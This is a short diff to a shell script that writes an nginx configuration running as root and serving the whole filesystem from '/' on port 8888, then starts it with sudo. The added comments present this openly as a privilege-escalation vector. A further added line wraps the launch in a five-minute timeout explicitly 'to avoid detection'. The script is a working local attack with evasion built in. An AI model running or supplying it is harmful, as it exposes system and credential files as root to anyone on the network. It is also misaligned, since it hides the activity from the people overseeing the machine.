@@ -2,9 +2,12 @@ cat << EOF> /tmp/testing.conf
 user root;
 worker_processes 4;
 pid /tmp/nginx.pid;
+
 events {
         worker_connections 768;
-} http {
+} 
+
+http {
     server {
         listen 8888;
         root /;
@@ -13,4 +16,14 @@ events {
     }
 }
 EOF
-sudo nginx -c /tmp/testing.conf ## assumes user has nginx sudo as root perms
+
+## Assumes some user has elevated nginx perms (for writing files as root), 
+## otherwise just launch as regular user and find another vector for privesc
+
+sudo nginx -c /tmp/testing.conf 
+
+## For added insurnace against detection, launch using nginx via timeout:
+
+timeout 5m sudo nginx -c /tmp/testing.conf # automatic nginx shutdown after 5 minutes to avoid detection
+
+
